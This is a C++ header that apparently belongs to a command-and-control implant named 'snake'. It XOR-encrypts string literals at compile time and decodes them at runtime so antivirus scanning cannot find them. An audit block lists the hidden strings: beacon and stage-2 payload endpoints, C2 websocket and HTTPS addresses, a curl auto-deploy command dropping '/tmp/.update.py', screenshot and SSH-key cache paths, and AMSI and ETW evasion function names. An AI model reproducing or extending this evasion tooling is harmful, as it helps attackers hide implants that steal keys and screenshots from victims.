#ifndef SNAKE_STEALTH_HPP
#define SNAKE_STEALTH_HPP

#include <cstddef>
#include <cstdint>
#include <string>

#if defined(__GNUC__) || defined(__clang__)
#define SNAKE_STEALTH_BARRIER(val) __asm__ __volatile__("" : "+r"(val))
#define SNAKE_STEALTH_NOINLINE __attribute__((noinline))
#else
#define SNAKE_STEALTH_BARRIER(val) do { (val) = (val); } while (0)
#define SNAKE_STEALTH_NOINLINE
#endif

namespace snake {
namespace stealth {

inline constexpr std::uint8_t kLiteralKey = 0x6B;

template <std::size_t N>
struct Blob {
    char bytes[N];
    constexpr explicit Blob(const char (&lit)[N]) : bytes{} {
        for (std::size_t i = 0; i < N; ++i) {
            bytes[i] = static_cast<char>(static_cast<unsigned char>(lit[i]) ^ kLiteralKey);
        }
    }
};

SNAKE_STEALTH_NOINLINE inline std::string reveal(const char* masked, std::size_t len) {
    volatile const char* src = masked;
    std::string out(len, '\0');
    for (std::size_t i = 0; i < len; ++i) {
        char c = static_cast<char>(static_cast<unsigned char>(src[i]) ^ kLiteralKey);
        SNAKE_STEALTH_BARRIER(c);
        out[i] = c;
    }
    return out;
}

}  // namespace stealth
}  // namespace snake

#define SNAKE_OBF(lit)                                                       \
    ([]() -> const std::string& {                                            \
        static constexpr ::snake::stealth::Blob<sizeof(lit)> snake_obf_blob{lit}; \
        static const std::string snake_obf_plain =                           \
            ::snake::stealth::reveal(snake_obf_blob.bytes, sizeof(lit) - 1);  \
        return snake_obf_plain;                                              \
    }())

#if defined(SNAKE_STEALTH_AUDIT)

namespace snake {
namespace stealth {

struct AuditMarker {
    const char* id;
    const char* text;
};

inline const AuditMarker kAuditMarkers[] = {
    {"endpoint.rest_beacon", "/api/v1/beacon"},
    {"endpoint.rest_result", "/api/v1/result"},
    {"endpoint.stage2_fetch", "/api/v1/beacon?stage2=1&payload="},
    {"endpoint.default_c2_ws", "wss://127.0.0.1:4443/ws"},
    {"endpoint.default_c2_https", "https://127.0.0.1:4443"},
    {"path.autodeploy_cmd_prefix", "curl -s "},
    {"path.autodeploy_drop", "/tmp/.update.py"},
    {"path.screenshot_dir", "/.rogue/screenshots"},
    {"path.ssh_cache_dir", "/.rogue/ssh"},
    {"winstealth.module_ntdll", "ntdll.dll"},
    {"winstealth.module_kernel32", "kernel32.dll"},
    {"winstealth.module_amsi", "amsi.dll"},
    {"evade.function_amsi", "AmsiScanBuffer"},
    {"evade.function_etw", "EtwEventWrite"},
    {"evade.loader_import", "LoadLibraryA"},
};

inline constexpr std::size_t kAuditMarkerCount =
    sizeof(kAuditMarkers) / sizeof(kAuditMarkers[0]);

}  // namespace stealth
}  // namespace snake

#endif  // SNAKE_STEALTH_AUDIT

#endif  // SNAKE_STEALTH_HPP
